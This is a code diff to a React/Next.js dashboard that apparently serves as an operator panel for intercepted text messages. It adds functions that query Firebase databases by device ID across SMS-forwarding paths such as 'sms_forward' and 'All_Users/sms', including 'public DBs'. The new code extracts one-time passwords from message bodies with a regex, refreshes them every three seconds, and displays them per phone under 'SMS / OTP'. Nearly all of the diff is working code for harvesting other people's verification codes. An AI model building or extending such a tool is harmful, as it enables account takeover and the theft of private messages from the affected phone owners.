@@ -1,10 +1,83 @@
 "use client";
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { maskSession } from "@/lib/share";
 
 const LS_ACCOUNTS = "pb_accounts";
 const LS_ACTIVE = "pb_active";
+
+function cleanBase(url) {
+  if (!url) return "";
+  let u = String(url).trim().replace(/\/$/, "");
+  u = u.replace(/\/\.json$/i, "").replace(/\.json$/i, "");
+  if (!/^https?:\/\//i.test(u)) u = "https://" + u;
+  return u;
+}
+
+function normalizeSms(node) {
+  if (!node || typeof node !== "object") return [];
+  const rows = [];
+  for (const [key, entry] of Object.entries(node)) {
+    if (!entry || typeof entry !== "object") continue;
+    const body = String(entry.message || entry.body || entry.msg || entry.text || entry.content || "");
+    if (!body) continue;
+    const sender = String(entry.sender || entry.from || entry.address || entry.ph || "");
+    const ts = String(entry.dateTime || entry.date || entry.timestamp || entry.time || key);
+    const otp =
+      (body.match(/(?:otp|code|pin|password)[^\d]{0,12}(\d{3,8})/i) || body.match(/\b(\d{4,8})\b/) || [])[1] ||
+      null;
+    rows.push({ key, body, sender, ts, otp });
+  }
+  rows.sort((a, b) => {
+    const na = parseInt(String(a.key), 10);
+    const nb = parseInt(String(b.key), 10);
+    if (!Number.isNaN(na) && !Number.isNaN(nb)) return nb - na;
+    return String(b.key).localeCompare(String(a.key));
+  });
+  return rows;
+}
+
+const SMS_PATHS = (id) => [
+  `messages/${id}`,
+  `user_sms/${id}`,
+  `sms/${id}`,
+  `sms_forward/${id}`,
+  `forwardSms/${id}`,
+  `All_Users/sms/${id}`,
+  `Sms/${id}`,
+];
+
+/** Direct Firebase fetch — faster than Vercel API for public DBs */
+async function fetchSmsDirect(base, deviceId, auth = "") {
+  const b = cleanBase(base);
+  for (const p of SMS_PATHS(deviceId)) {
+    // last 60 messages, cache-bust
+    let url = `${b}/${p}.json?orderBy=%22%24key%22&limitToLast=60&_=${Date.now()}`;
+    if (auth) url += `&auth=${encodeURIComponent(auth)}`;
+    try {
+      const r = await fetch(url, { cache: "no-store" });
+      if (!r.ok) continue;
+      const data = await r.json();
+      if (data && typeof data === "object") {
+        const rows = normalizeSms(data);
+        if (rows.length) return { messages: rows, path: p };
+      }
+    } catch {}
+    // fallback without orderBy
+    try {
+      let url2 = `${b}/${p}.json?_=${Date.now()}`;
+      if (auth) url2 += `${url2.includes("?") ? "&" : "?"}auth=${encodeURIComponent(auth)}`;
+      const r2 = await fetch(url2, { cache: "no-store" });
+      if (!r2.ok) continue;
+      const data2 = await r2.json();
+      if (data2 && typeof data2 === "object") {
+        const rows = normalizeSms(data2).slice(0, 60);
+        if (rows.length) return { messages: rows, path: p };
+      }
+    } catch {}
+  }
+  return { messages: [], path: null };
+}
 
 export default function Dashboard() {
   const router = useRouter();
@@ -18,6 +91,19 @@ export default function Dashboard() {
   const [smsOpen, setSmsOpen] = useState(null);
   const [messages, setMessages] = useState([]);
   const [smsFilter, setSmsFilter] = useState("");
+  const [smsPath, setSmsPath] = useState("");
+  const [lastSmsAt, setLastSmsAt] = useState(null);
+  const [autoOn, setAutoOn] = useState(true);
+  const pollRef = useRef(null);
+  const smsOpenRef = useRef(null);
+  const activeRef = useRef(null);
+
+  useEffect(() => {
+    smsOpenRef.current = smsOpen;
+  }, [smsOpen]);
+  useEffect(() => {
+    activeRef.current = active;
+  }, [active]);
 
   useEffect(() => {
     try {
@@ -39,11 +125,42 @@ export default function Dashboard() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [active]);
 
+  // auto-refresh SMS every 3s while modal open
+  useEffect(() => {
+    if (pollRef.current) {
+      clearInterval(pollRef.current);
+      pollRef.current = null;
+    }
+    if (!smsOpen || !active || !autoOn) return;
+
+    const tick = async () => {
+      const dev = smsOpenRef.current;
+      const acc = activeRef.current;
+      if (!dev || !acc) return;
+      try {
+        const { messages: rows, path } = await fetchSmsDirect(acc.url, dev.id, acc.auth || "");
+        if (rows.length) {
+          setMessages(rows);
+          if (path) setSmsPath(path);
+          setLastSmsAt(new Date());
+        }
+      } catch {}
+    };
+
+    tick(); // immediate
+    pollRef.current = setInterval(tick, 3000);
+
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, [smsOpen, active, autoOn]);
+
   async function api(payload) {
     const r = await fetch("/api/fb", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
+      cache: "no-store",
     });
     return r.json();
   }
@@ -67,8 +184,19 @@ export default function Dashboard() {
   async function openSms(device) {
     setSmsOpen(device);
     setMessages([]);
+    setSmsPath("");
     setSmsLoading(true);
     try {
+      // direct first (fast)
+      const direct = await fetchSmsDirect(active.url, device.id, active.auth || "");
+      if (direct.messages.length) {
+        setMessages(direct.messages);
+        setSmsPath(direct.path || "");
+        setLastSmsAt(new Date());
+        setSmsLoading(false);
+        return;
+      }
+      // API fallback
       const data = await api({
         action: "sms",
         url: active.url,
@@ -76,8 +204,23 @@ export default function Dashboard() {
         deviceId: device.id,
       });
       setMessages(data.messages || []);
+      setSmsPath(data.path || "");
+      setLastSmsAt(new Date());
     } catch {
       setMessages([]);
+    } finally {
+      setSmsLoading(false);
+    }
+  }
+
+  async function manualRefreshSms() {
+    if (!smsOpen || !active) return;
+    setSmsLoading(true);
+    try {
+      const direct = await fetchSmsDirect(active.url, smsOpen.id, active.auth || "");
+      setMessages(direct.messages || []);
+      if (direct.path) setSmsPath(direct.path);
+      setLastSmsAt(new Date());
     } finally {
       setSmsLoading(false);
     }
@@ -143,7 +286,7 @@ export default function Dashboard() {
         <div className="stat"><div className="k">TOTAL</div><div className="v">{devices.length}</div></div>
         <div className="stat"><div className="k">ONLINE</div><div className="v" style={{ color: "#86efac" }}>{online}</div></div>
         <div className="stat"><div className="k">OFFLINE</div><div className="v">{offline}</div></div>
-        <div className="stat"><div className="k">SMS</div><div className="v">—</div></div>
+        <div className="stat"><div className="k">POLL</div><div className="v" style={{ fontSize: 14 }}>{autoOn ? "3s" : "OFF"}</div></div>
       </div>
 
       <div className="toolbar">
@@ -197,9 +340,21 @@ export default function Dashboard() {
       {smsOpen && (
         <div className="modal-bg" onClick={() => setSmsOpen(null)}>
           <div className="modal" onClick={(e) => e.stopPropagation()}>
-            <div style={{ display: "flex", justifyContent: "space-between" }}>
-              <h3 style={{ margin: 0 }}>SMS / OTP · {smsOpen.phone || smsOpen.id}</h3>
-              <button className="btn ghost" onClick={() => setSmsOpen(null)}>Close</button>
+            <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "flex-start" }}>
+              <div>
+                <h3 style={{ margin: 0 }}>SMS / OTP · {smsOpen.phone || smsOpen.id}</h3>
+                <div style={{ color: "var(--muted)", fontSize: 12 }}>
+                  {smsOpen.id}
+                  {smsPath ? ` · ${smsPath}` : ""}
+                  {autoOn ? " · auto every 3s" : " · auto off"}
+                  {lastSmsAt ? ` · ${lastSmsAt.toLocaleTimeString()}` : ""}
+                </div>
+              </div>
+              <div style={{ display: "flex", gap: 6 }}>
+                <button className="btn" onClick={manualRefreshSms}>{smsLoading ? "..." : "Refresh"}</button>
+                <button className="btn ghost" onClick={() => setAutoOn((v) => !v)}>{autoOn ? "Auto:ON" : "Auto:OFF"}</button>
+                <button className="btn ghost" onClick={() => setSmsOpen(null)}>Close</button>
+              </div>
             </div>
             <input
               style={{ width: "100%", margin: "12px 0", padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
@@ -207,11 +362,15 @@ export default function Dashboard() {
               value={smsFilter}
               onChange={(e) => setSmsFilter(e.target.value)}
             />
-            {smsLoading && <div className="empty">Loading SMS...</div>}
-            {!smsLoading && smsFiltered.length === 0 && <div className="empty">No SMS found</div>}
+            {smsLoading && messages.length === 0 && <div className="empty">Loading SMS...</div>}
+            {!smsLoading && smsFiltered.length === 0 && <div className="empty">No SMS found on known paths</div>}
             {smsFiltered.map((m) => (
               <div className="sms-row" key={m.key}>
-                <div className="s">{m.sender || "Unknown"} · {m.ts || m.key}</div>
+                <div className="s">
+                  <b style={{ color: "#f87171" }}>{m.sender || "Unknown"}</b>
+                  {" · "}
+                  {m.ts || m.key}
+                </div>
                 <div>{m.body}</div>
                 {m.otp && <div className="otp">OTP: {m.otp}</div>}
               </div>
